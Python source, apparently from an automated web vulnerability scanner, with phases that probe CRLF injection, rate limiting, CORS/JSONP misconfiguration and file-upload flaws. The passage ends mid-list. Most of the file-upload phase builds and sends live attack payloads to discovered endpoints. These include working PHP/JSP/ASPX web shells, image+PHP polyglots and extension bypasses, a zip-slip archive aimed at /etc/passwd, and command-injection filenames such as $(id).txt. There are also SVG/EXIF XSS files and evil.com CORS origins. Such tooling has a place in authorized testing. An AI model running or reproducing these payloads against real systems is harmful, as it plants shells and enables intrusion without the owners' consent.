_CRLF_PAYLOADS = [
    ("\r\nX-Injected: yes", "X-Injected"),
    ("\r\nX-Injected: yes\r\n", "X-Injected"),
    ("\nX-Injected: yes", "X-Injected"),
    ("\r\n\r\n<html>injected</html>", "injected"),
    ("\r\nSet-Cookie: crlf=injected", "crlf=injected"),
]


async def phase_33_CRLF(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"33-CRLF"}:
        return {}
    _out = outdir / "crlf_injection.txt"
    if _out.exists() and not force:
        return {"33-CRLF": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 33-CRLF: CRLF injection / HTTP response splitting")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("WARNING", "33-CRLF: no URLs; skipping")
        return {"33-CRLF": str(_out), "count": 0}
    findings: List[str] = []
    _crlf_urlopen = _get_urlopener()
    _crlf_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][
        : _PIPELINE_CFG.sample_urls_crlf
    ]
    if t.has("crlfuzz") and param_urls:
        crlfuzz_in = ensure(outdir / "crlfuzz_input.txt")
        crlfuzz_in.write_text("\n".join(param_urls) + "\n")
        crlfuzz_out = outdir / "crlfuzz_results.txt"
        runner = outdir / "logs" / "crlfuzz_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(crlfuzz_in))}\n"
            f"OUT={shlex.quote(str(crlfuzz_out))}\n"
            'crlfuzz -l "$IN" -o "$OUT"\n'
        )
        runner.chmod(0o700)
        await _run("crlfuzz", ["bash", str(runner)], 600, outdir)
        if crlfuzz_out.exists() and read_lines(crlfuzz_out):
            for ln in read_lines(crlfuzz_out):
                findings.append(f"[crlfuzz] {ln.strip()}")
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload, indicator in _CRLF_PAYLOADS:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(
                        test_url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_crlf_extra_headers},
                    )
                    resp_status, resp_headers, resp_body = await _async_urlopen_no_redirect(req, timeout=10
                    )
                    body_str = resp_body.decode("utf-8", errors="ignore")
                    headers_str = str(resp_headers).lower()
                    if indicator in body_str or indicator.lower() in headers_str:
                        findings.append(
                            f"[crlf-injection] {test_url} via {param_name} payload={payload} -> {indicator} reflected"
                        )
                except urllib.error.HTTPError as e:
                    try:
                        body = e.read().decode("utf-8", errors="ignore")
                        if indicator in body:
                            findings.append(
                                f"[crlf-injection] {test_url} via {param_name} payload={payload} -> {indicator} in error body"
                            )
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        pass
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
    if not findings:
        findings.append("[crlf] No CRLF injection candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"33-CRLF: {len(findings)} CRLF probes -> {out}")
    return {"33-CRLF": str(out), "count": len(findings)}


async def phase_34_RATELIMIT(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"34-RATELIMIT"}:
        return {}
    _out = outdir / "rate_limiting.txt"
    if _out.exists() and not force:
        return {"34-RATELIMIT": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 34-RATELIMIT: rate limiting / brute-force protection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("WARNING", "34-RATELIMIT: no URLs; skipping")
        return {"34-RATELIMIT": str(_out), "count": 0}
    findings: List[str] = []
    _rl_urlopen = _get_urlopener()
    _rl_extra_headers = _extra_headers_dict()
    _burst_size = 10 if (_PIPELINE_CFG.proxy or _USE_PROXYCHAINS) else 50
    login_targets = [
        u
        for u in all_urls
        if any(m in u.lower() for m in ("/login", "/signin", "/auth", "/oauth", "/token", "/api/"))
    ][: _PIPELINE_CFG.sample_hosts_ratelimit]
    if not login_targets:
        login_targets = all_urls[: _PIPELINE_CFG.sample_hosts_ratelimit]
    for url in login_targets:
        try:
            statuses: List[int] = []
            for _ in range(_burst_size):
                await _throttle_rate()
                req = urllib.request.Request(
                    url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_rl_extra_headers}
                )
                s, resp_h, _ = await _async_urlopen_no_redirect(req, timeout=8)
                statuses.append(s)
                if s in (429, 503) or "retry-after" in str(resp_h).lower():
                    findings.append(
                        f"[rate-limit-detected] {url} — rate limited after {len(statuses)} requests (HTTP {s})"
                    )
                    break
            else:
                len(set(statuses))
                rate_limited = any(s in (429, 503) for s in statuses)
                if len(statuses) >= _burst_size and not rate_limited:
                    findings.append(
                        f"[rate-limit-missing] {url} — no rate limiting after {_burst_size} requests"
                    )
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
    if not findings:
        findings.append("[rate-limit] No rate limiting checks completed")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"34-RATELIMIT: {len(findings)} rate limit checks -> {out}")
    return {"34-RATELIMIT": str(out), "count": len(findings)}


# ────────────────── Phase 35-CORSADV: Advanced CORS Testing ────────────────────
def _cors_misconfig(acao: str, acac: str, origin: str) -> bool:
    if not acao:
        return False
    allowed = [a.strip() for a in acao.split(",") if a.strip()]
    if "*" in allowed:
        return acac.lower() == "true"
    return origin in allowed


async def phase_35_CORSADV(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"35-CORSADV"}:
        return {}
    _out = outdir / "cors_advanced.txt"
    if _out.exists() and not force:
        return {"35-CORSADV": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 35-CORSADV: advanced CORS misconfiguration testing")
    findings: List[str] = []
    _cors_urlopen = _get_urlopener()
    _cors_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    api_endpoints = list(
        {u for u in all_urls if any(m in u.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql"))}
    )[: _PIPELINE_CFG.sample_endpoints_corsadv]
    if not api_endpoints:
        api_endpoints = list(all_urls)[: _PIPELINE_CFG.sample_endpoints_corsadv]
    if not api_endpoints:
        log("WARNING", "35-CORSADV: no endpoints; skipping")
        return {"35-CORSADV": str(_out), "count": 0}
    # Corsy CORS misconfiguration scanner
    if t.has("corsy") and api_endpoints:
        corsy_in = ensure(outdir / "corsy_input.txt")
        corsy_in.write_text("\n".join(api_endpoints) + "\n")
        corsy_out = outdir / "corsy_results.txt"
        runner = outdir / "logs" / "corsy_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(corsy_in))}\n"
            f"OUT={shlex.quote(str(corsy_out))}\n"
            'corsy -i "$IN" -o "$OUT"\n'
        )
        runner.chmod(0o700)
        await _run("corsy", ["bash", str(runner)], 600, outdir)
        if corsy_out.exists() and read_lines(corsy_out):
            for ln in read_lines(corsy_out):
                findings.append(f"[corsy] {ln.strip()}")
    _CORS_TEST_ORIGINS = [
        "https://evil.com",
        "https://sub.evil.com",
        "null",
        "https://evil.com:8080",
        "https://evil.com.evil2.com",
        "https://evil.com%2f.evil2.com",
    ]

    async def _check_cors_origin(url: str, origin: str) -> Optional[str]:
        try:
            req = urllib.request.Request(
                url,
                method="OPTIONS",
                headers={"User-Agent": "Mozilla/5.0", "Origin": origin, **_cors_extra_headers},
            )
            _, ch, _ = await _async_urlopen_no_redirect(req, timeout=8)
            acao = ch.get("Access-Control-Allow-Origin", "")
            acac = ch.get("Access-Control-Allow-Credentials", "")
            if _cors_misconfig(acao, acac, origin):
                creds = " with credentials" if acac.lower() == "true" else ""
                return f"[cors-misconfig] {url} ACAO={acao} origin={origin}{creds}"
            if origin and origin.lower() in str(ch).lower() and origin != "null":
                return f"[cors-origin-reflection] {url} origin={origin} reflected in headers"
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        try:
            g_req = urllib.request.Request(
                url,
                method="GET",
                headers={"User-Agent": "Mozilla/5.0", "Origin": origin, **_cors_extra_headers},
            )
            _, gh, _ = await _async_urlopen_no_redirect(g_req, timeout=8)
            g_acao = gh.get("Access-Control-Allow-Origin", "")
            g_acac = gh.get("Access-Control-Allow-Credentials", "")
            if _cors_misconfig(g_acao, g_acac, origin):
                creds = " with credentials" if g_acac.lower() == "true" else ""
                return f"[cors-misconfig] {url} ACAO={g_acao} origin={origin} (GET){creds}"
            if origin and origin.lower() in str(gh).lower() and origin != "null":
                return f"[cors-origin-reflection] {url} origin={origin} reflected in headers (GET)"
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        return None

    cors_results = await asyncio.gather(
        *[_check_cors_origin(ep, o) for ep in api_endpoints for o in _CORS_TEST_ORIGINS]
    )
    for r in cors_results:
        if r:
            findings.append(r)
    # ── JSONP endpoint detection ──
    jsonp_endpoints: Set[str] = set()
    jsonp_params = {"callback=", "jsonp=", "cb=", "jsoncallback="}
    for u in all_urls:
        qs = urllib.parse.urlparse(u).query
        if qs and any(p in qs.lower() for p in jsonp_params):
            jsonp_endpoints.add(u.split("?")[0])
    for ep in list(jsonp_endpoints)[:10]:
        try:
            test_val = "jQuery1234_test"
            jsonp_url = f"{ep}?callback={test_val}"
            req = urllib.request.Request(
                jsonp_url,
                method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_cors_extra_headers},
            )
            _, _, body_bytes = await _async_urlopen_no_redirect(req, timeout=8)
            body = body_bytes.decode("utf-8", errors="ignore")
            if test_val in body and ("(" in body and ")" in body):
                findings.append(
                    f"[jsonp-endpoint] {ep} — callback param reflected with wrapping (JSONP)"
                )
                inject_val = "alert(1)"
                inject_url = f"{ep}?callback={inject_val}"
                ireq = urllib.request.Request(
                    inject_url,
                    method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_cors_extra_headers},
                )
                _, _, ibody_bytes = await _async_urlopen_no_redirect(ireq, timeout=8)
                ibody = ibody_bytes.decode("utf-8", errors="ignore")
                if (
                    inject_val in ibody
                    and not ibody.startswith("//")
                    and not ibody.startswith("/**")
                ):
                    findings.append(
                        f"[jsonp-injectable] {ep} — callback value injectable into response (XSS/CSRF)"
                    )
                findings.append(
                    f"[jsonp-legacy] {ep} — JSONP callback present; legacy API may be exploitable from any origin"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

    if not findings:
        findings.append("[cors] No advanced CORS misconfigurations detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"35-CORSADV: {len(findings)} CORS checks -> {out}")
    return {"35-CORSADV": str(out), "count": len(findings)}


_FILEUPLOAD_TEST_FILES = [
    ("php_webshell.php", "<?php system($_GET['cmd']); ?>", "text/plain"),
    ("test.jsp", '<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>', "text/plain"),
    ("test.aspx", '<%@ Page Language="C#" %><%= Request.QueryString["cmd"] %>', "text/plain"),
    ("test.php5", "<?php echo 'test'; ?>", "image/jpeg"),
    ("test.phtml", "<?php echo 'test'; ?>", "image/png"),
    ("test.cgi", "#!/bin/bash\necho 'test'", "text/plain"),
    (
        "test.svg",
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
        "image/svg+xml",
    ),
    ("test.html", "<script>alert(document.cookie)</script>", "text/html"),
    ("test.htaccess", "AddType application/x-httpd-php .txt", "text/plain"),
    ("test.zip", "PK", "application/zip"),
    # Polyglot payloads — files that are valid as multiple types simultaneously
    (
        "polyglot.php.jpg",
        "\xff\xd8\xff\xe0" + "<?php system($_GET['c']); ?>" + "\xff\xd9",
        "image/jpeg",
    ),
    ("polyglot.php.png", "\x89PNG\r\n\x1a\n" + "<?php system($_GET['c']); ?>", "image/png"),
    (
        "polyglot.svg.php",
        '<?php system($_GET["c"]); ?>' + '<svg xmlns="http://www.w3.org/2000/svg"></svg>',
        "image/svg+xml",
    ),
    ("shell.php.jpg", "\xff\xd8\xff\xe0" + "GIF89a" + "<?php system($_GET['c']); ?>", "image/jpeg"),
    ("test.php%00.jpg", "<?php system($_GET['c']); ?>", "image/jpeg"),
    ("test.php%0a.jpg", "<?php system($_GET['c']); ?>", "image/jpeg"),
    # Double extension bypass
    ("shell.php.jpg.bak", "<?php system($_GET['c']); ?>", "application/octet-stream"),
    ("shell.pHp", "<?php system($_GET['c']); ?>", "text/plain"),
    ("shell.PHP", "<?php system($_GET['c']); ?>", "text/plain"),
    ("shell.phtml.jpg", "<?php system($_GET['c']); ?>", "image/jpeg"),
    # Content-type confusion
    ("cmd.php", "<?php system($_GET['c']); ?>", "image/jpeg"),
    ("cmd.php", "<?php system($_GET['c']); ?>", "image/png"),
    ("cmd.php", "<?php system($_GET['c']); ?>", "application/pdf"),
    ("cmd.php", "<?php system($_GET['c']); ?>", "application/zip"),
    # ASP/JSP variants
    ("shell.asp;.jpg", '<%Response.Write("test")%>', "image/jpeg"),
    ("shell.asp:.jpg", '<%Response.Write("test")%>', "image/jpeg"),
    ("shell.jsp;.png", '<%=Runtime.getRuntime().exec("id")%>', "image/png"),
    ("shell.jsp::$DATA", '<%=Runtime.getRuntime().exec("id")%>', "text/plain"),
    # Null byte and special chars
    ("test.php\x00.png", "<?php system($_GET['c']); ?>", "image/png"),
    ("test.php%00.jpg", "<?php system($_GET['c']); ?>", "image/jpeg"),
    # SVG with script (XSS)
    (
        "xss.svg",
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>',
        "image/svg+xml",
    ),
    # SSI injection
    ("test.shtml", '<!--#exec cmd="id" -->', "text/html"),
    # Phar deserialization
    ("test.phar", "PK\x03\x04", "application/zip"),
    ("polyglot.jpg.js", "\xff\xd8\xff\xe0" + "<?js alert(1)?>", "image/jpeg"),
]


async def phase_37_FILEUPLOAD(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"37-FILEUPLOAD"}:
        return {}
    _out = outdir / "file_upload.txt"
    if _out.exists() and not force:
        return {"37-FILEUPLOAD": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 37-FILEUPLOAD: file upload vulnerability testing")
    findings: List[str] = []
    upload_urlopen = _get_urlopener()
    _fu_extra_headers = _extra_headers_dict()
    upload_candidates: Set[str] = set()
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        for u in read_lines(urls_file):
            low = u.lower()
            if any(
                m in low for m in ("/upload", "/file", "/import", "/attach", "/media", "/image")
            ):
                upload_candidates.add(u.split("?")[0])
    fuzz_file = outdir / "fuzz.txt"
    if fuzz_file.exists():
        for ln in read_lines(fuzz_file):
            low = ln.lower()
            if any(
                m in low for m in ("/upload", "/file", "/import", "/attach", "/media", "/image")
            ):
                upload_candidates.add(
                    ln.split("\t")[-1] if "\t" in ln else (ln.split()[0] if " " in ln else ln)
                )
    targets = list(upload_candidates)[: _PIPELINE_CFG.sample_urls_upload]
    if not targets:
        log("WARNING", "37-FILEUPLOAD: no upload endpoints found; skipping")
        return {"37-FILEUPLOAD": str(_out), "count": 0}
    for ep in targets:
        for fname, content, content_type in _FILEUPLOAD_TEST_FILES:
            try:
                boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
                body_parts = [
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="{fname}"\r\n'
                    f"Content-Type: {content_type}\r\n\r\n"
                    f"{content}\r\n"
                    f"--{boundary}--\r\n"
                ]
                body = "".join(body_parts).encode("utf-8")
                req = urllib.request.Request(
                    ep,
                    data=body,
                    method="POST",
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                        "User-Agent": "Mozilla/5.0",
                        **_fu_extra_headers,
                    },
                )
                up_status, _, up_body = await _async_urlopen(upload_urlopen, req, timeout=15)
                up_text = up_body.decode("utf-8", errors="ignore").lower()
                if up_status in (200, 201, 302, 301):
                    findings.append(
                        f"[upload-accepted] {ep} file={fname} type={content_type} -> HTTP {up_status}"
                    )
                if fname in up_text or fname.replace(".", "_") in up_text:
                    findings.append(
                        f"[upload-stored] {ep} file={fname} reflected in response -> possible stored access"
                    )
            except urllib.error.HTTPError as e:
                if e.code not in (403, 404, 405, 413, 415, 501):
                    findings.append(f"[upload-response] {ep} file={fname} -> HTTP {e.code}")
            except asyncio.CancelledError:
                raise
            except Exception:
                continue

    # Zip slip: path traversal via ../ in zip entries
    for ep in targets:
        try:
            import struct as _struct
            import zlib as _zlib

            zlib_available = hasattr(_zlib, "crc32")
            if not zlib_available:
                break
            traversal_entry = "../../../etc/passwd"
            zip_data = b"PK\x03\x04"
            zip_data += _struct.pack("<HHHHH", 20, 0, 0, 0, 0)
            fname_bytes = traversal_entry.encode("utf-8")
            content_bytes = b"root:x:0:0:root:/root:/bin/bash\n"
            zip_data += _struct.pack("<H", len(fname_bytes))
            zip_data += _struct.pack("<H", 0)
            zip_data += fname_bytes
            zip_data += _struct.pack(
                "<IHHHHHIIII",
                _zlib.crc32(content_bytes) & 0xFFFFFFFF,
                0,
                0,
                0,
                len(content_bytes),
                len(content_bytes),
                0,
                0,
                0,
                0,
            )
            zip_data += content_bytes
            boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
            body_parts = [
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="slip.zip"\r\n'
                f"Content-Type: application/zip\r\n\r\n"
            ]
            body_parts.append(zip_data.decode("latin-1"))
            body_parts.append(f"\r\n--{boundary}--\r\n")
            body = "".join(body_parts).encode("latin-1")
            req = urllib.request.Request(
                ep,
                data=body,
                method="POST",
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "User-Agent": "Mozilla/5.0",
                    **_fu_extra_headers,
                },
            )
            zs, _, zb = await _async_urlopen(upload_urlopen, req, timeout=15)
            if zs in (200, 201):
                findings.append(f"[zip-slip-tested] {ep} — zip with ../ entry uploaded (HTTP {zs})")
        except asyncio.CancelledError:
            raise
        except Exception:
            pass

    # Filename injection: path traversal via filename + command injection via filename
    for ep in targets:
        for inj_fname in [
            "../../var/www/html/shell.php",
            "file;ls;.txt",
            "$(id).txt",
            "`id`.txt",
            "file|id|.txt",
        ]:
            try:
                boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
                content = "<?php echo 'test'; ?>"
                body_parts = [
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="{inj_fname}"\r\n'
                    f"Content-Type: text/plain\r\n\r\n"
                    f"{content}\r\n"
                    f"--{boundary}--\r\n"
                ]
                body = "".join(body_parts).encode("utf-8")
                req = urllib.request.Request(
                    ep,
                    data=body,
                    method="POST",
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                        "User-Agent": "Mozilla/5.0",
                        **_fu_extra_headers,
                    },
                )
                inj_status, _, inj_body = await _async_urlopen(upload_urlopen, req, timeout=15)
                inj_text = inj_body.decode("utf-8", errors="ignore")
                if inj_status in (200, 201):
                    findings.append(
                        f"[filename-injection] {ep} — filename={inj_fname} uploaded (HTTP {inj_status})"
                    )
                if inj_fname in inj_text or "../../" in inj_text:
                    findings.append(
                        f"[filename-traversal-reflected] {ep} — path traversal in filename reflected: {inj_fname}"
                    )
            except urllib.error.HTTPError as e:
                if e.code not in (403, 404, 415):
                    findings.append(
                        f"[filename-injection] {ep} filename={inj_fname} -> HTTP {e.code}"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue

    # SVG-based XSS: onload, onmouseover, onerror in SVG
    for ep in targets:
        svg_payloads = [
            (
                "svg_onload.svg",
                '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><circle cx="50" cy="50" r="40"/></svg>',
            ),
            (
                "svg_onmouseover.svg",
                '<svg xmlns="http://www.w3.org/2000/svg" onmouseover="alert(1)"><rect width="100" height="100"/></svg>',
            ),
            (
                "svg_onerror.svg",
                '<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="alert(1)"/></svg>',
            ),
            (
                "svg_foreign.svg",
                '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe src="javascript:alert(1)"/></foreignObject></svg>',
            ),
            (
                "svg_anim.svg",
                '<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x"/></svg>',
            ),
        ]
        for fname, svg_content in svg_payloads:
            try:
                boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
                body_parts = [
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="{fname}"\r\n'
                    f"Content-Type: image/svg+xml\r\n\r\n"
                    f"{svg_content}\r\n"
                    f"--{boundary}--\r\n"
                ]
                body = "".join(body_parts).encode("utf-8")
                req = urllib.request.Request(
                    ep,
                    data=body,
                    method="POST",
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                        "User-Agent": "Mozilla/5.0",
                        **_fu_extra_headers,
                    },
                )
                svg_status, _, _ = await _async_urlopen(upload_urlopen, req, timeout=15)
                if svg_status in (200, 201):
                    findings.append(
                        f"[svg-xss-tested] {ep} — {fname} uploaded (HTTP {svg_status}) — check if SVG XSS fires"
                    )
            except urllib.error.HTTPError as e:
                if e.code not in (403, 404, 415):
                    findings.append(f"[svg-xss] {ep} {fname} -> HTTP {e.code}")
            except asyncio.CancelledError:
                raise
            except Exception:
                continue

    # Race condition: 5 concurrent uploads of the same file
    for ep in targets:
        try:
            race_boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
            race_body_parts = [
                f"--{race_boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="race.php"\r\n'
                f"Content-Type: text/plain\r\n\r\n"
                f"<?php echo 'race_test'; ?>\r\n"
                f"--{race_boundary}--\r\n"
            ]
            race_body = "".join(race_body_parts).encode("utf-8")
            race_tasks = []
            for _ in range(5):
                race_req = urllib.request.Request(
                    ep,
                    data=race_body,
                    method="POST",
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={race_boundary}",
                        "User-Agent": "Mozilla/5.0",
                        **_fu_extra_headers,
                    },
                )
                race_tasks.append(_async_urlopen(upload_urlopen, race_req, timeout=15))
            race_results = await asyncio.gather(*race_tasks, return_exceptions=True)
            race_ok = sum(1 for r in race_results if isinstance(r, tuple) and r[0] in (200, 201))
            if race_ok > 1:
                findings.append(
                    f"[race-condition] {ep} — {race_ok}/5 concurrent uploads accepted — potential file write race"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

    # EXIF metadata injection via JPEG with XSS in Author field
    for ep in targets:
        try:
            import struct as _struct

            xs = b"<script>alert(1)</script>"
            exif_body = b"Exif\x00\x00"
            exif_body += b"II\x2a\x00\x08\x00\x00\x00"
            exif_body += _struct.pack("<H", 1)
            exif_body += _struct.pack("<H", 0x013B)
            exif_body += _struct.pack("<H", 2)
            exif_body += _struct.pack("<I", len(xs) + 1)
            exif_body += _struct.pack("<I", 26)
            exif_body += _struct.pack("<I", 0)
            exif_body += xs + b"\x00"
            jpeg_data = b"\xff\xd8"
            jpeg_data += b"\xff\xe1"
            jpeg_data += _struct.pack(">H", len(exif_body) + 2)
            jpeg_data += exif_body
            jpeg_data += b"\xff\xd9"
            exif_boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
            exif_body_parts = [
                f"--{exif_boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="exif.jpg"\r\n'
                f"Content-Type: image/jpeg\r\n\r\n"
            ]
            exif_body_parts.append(jpeg_data.decode("latin-1"))
            exif_body_parts.append(f"\r\n--{exif_boundary}--\r\n")
            exif_body_enc = "".join(exif_body_parts).encode("latin-1")
            exif_req = urllib.request.Request(
                ep,
                data=exif_body_enc,
                method="POST",
                headers={
                    "Content-Type": f"multipart/form-data; boundary={exif_boundary}",
                    "User-Agent": "Mozilla/5.0",
                    **_fu_extra_headers,
                },
            )
            exif_status, _, exif_resp = await _async_urlopen(upload_urlopen, exif_req, timeout=15)
            exif_text = exif_resp.decode("utf-8", errors="ignore").lower()
            if "alert(1)" in exif_text or "<script>" in exif_text:
                findings.append(
                    f"[exif-xss-reflected] {ep} — EXIF Author XSS payload reflected in response"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

    # GIF+PHP polyglot generator
    for ep in targets:
        try:
            import struct as _struct

            gif = b"GIF89a"
            gif += _struct.pack("<HHBBB", 1, 1, 0x00, 0, 0)
            gif += b"<?php system($_GET['cmd']); ?>"
            gif += b"\x00\x3b"
            gif_boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
            gif_body_parts = [
                f"--{gif_boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="polyglot.gif"\r\n'
                f"Content-Type: image/gif\r\n\r\n"
            ]
            gif_body_parts.append(gif.decode("latin-1"))
            gif_body_parts.append(f"\r\n--{gif_boundary}--\r\n")
            gif_body = "".join(gif_body_parts).encode("latin-1")
            gif_req = urllib.request.Request(
                ep,
                data=gif_body,
                method="POST",
                headers={
                    "Content-Type": f"multipart/form-data; boundary={gif_boundary}",
                    "User-Agent": "Mozilla/5.0",
                    **_fu_extra_headers,
                },
            )
            gif_status, _, _ = await _async_urlopen(upload_urlopen, gif_req, timeout=15)
            if gif_status in (200, 201):
                findings.append(
                    f"[gif-php-polyglot] {ep} — GIF+PHP polyglot uploaded (HTTP {gif_status})"
                )
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

    # Filesize limit bypass via Content-Range header
    for ep in targets:
        try:
            large_body = b"A" * 50000
            cr_boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
            cr_body_parts = [
                f"--{cr_boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="large.txt"\r\n'
                f"Content-Type: text/plain\r\n\r\n"
            ]
            cr_body_parts.append(large_body.decode("latin-1"))
            cr_body_parts.append(f"\r\n--{cr_boundary}--\r\n")
            cr_body = "".join(cr_body_parts).encode("latin-1")
            cr_req = urllib.request.Request(
                ep,
                data=cr_body,
                method="POST",
                headers={
                    "Content-Type": f"multipart/form-data; boundary={cr_boundary}",
                    "Content-Range": "bytes 0-50/100",
                    "User-Agent": "Mozilla/5.0",
                    **_fu_extra_headers,
                },
            )
            cr_status, _, _ = await _async_urlopen(upload_urlopen, cr_req, timeout=15)
            if cr_status in (200, 201):
                findings.append(
                    f"[content-range-bypass] {ep} — upload accepted with Content-Range header (HTTP {cr_status}) — size limit bypass possible"
                )
        except urllib.error.HTTPError as e:
            if e.code not in (403, 404, 413, 415, 501):
                findings.append(f"[content-range-bypass] {ep} -> HTTP {e.code}")
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

    # ImageMagick command injection via filename with -delete/-resize style options
    for ep in targets:
        for im_payload in ["-delete", "-resize", "https://evil.com/image.jpg", "|id|"]:
            try:
                im_fname = f"test{im_payload}.png"
                im_boundary = "----WebKitFormBoundary" + base64.b64encode(os.urandom(16)).decode()
                im_body_parts = [
                    f"--{im_boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="{im_fname}"\r\n'
                    f"Content-Type: image/png\r\n\r\n"
                    f"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82\r\n"
                    f"--{im_boundary}--\r\n"
                ]
                im_body = "".join(im_body_parts).encode("utf-8")
                im_req = urllib.request.Request(
                    ep,
                    data=im_body,
                    method="POST",
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={im_boundary}",
                        "User-Agent": "Mozilla/5.0",
                        **_fu_extra_headers,
                    },
                )
                im_status, _, im_resp = await _async_urlopen(upload_urlopen, im_req, timeout=15)
                if im_status in (200, 201):
                    findings.append(
                        f"[imagemagick-injection] {ep} — filename='{im_fname}' uploaded (HTTP {im_status}) — check for ImageMagick option injection"
                    )
            except urllib.error.HTTPError as e:
                if e.code not in (403, 404, 415):
                    findings.append(f"[imagemagick-injection] {ep} -> HTTP {e.code}")
            except Exception:
                continue

    if not findings:
        findings.append("[fileupload] No upload vulnerabilities detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"37-FILEUPLOAD: {len(findings)} upload probes -> {out}")
    return {"37-FILEUPLOAD": str(out), "count": len(findings)}


_CSP_BYPASS_CDNS = {
    "cdn.jsdelivr.net",
    "cdnjs.cloudflare.com",
    "unpkg.com",
    "ajax.googleapis.com",
    "ajax.aspnetcdn.com",
    "stackpath.bootstrapcdn.com",
    "maxcdn.bootstrapcdn.com",
    "code.jquery.com",
    "cdn.shopify.com",
    "cdn.rawgit.com",
    "rawgit.com",
    "gitcdn.xyz",
    "cdn.statically.io",
    "www.google.com",
    "accounts.google.com",
    "apis.google.com",
    "youtube.com",
    "www.youtube.com",
    "platform.twitter.com",
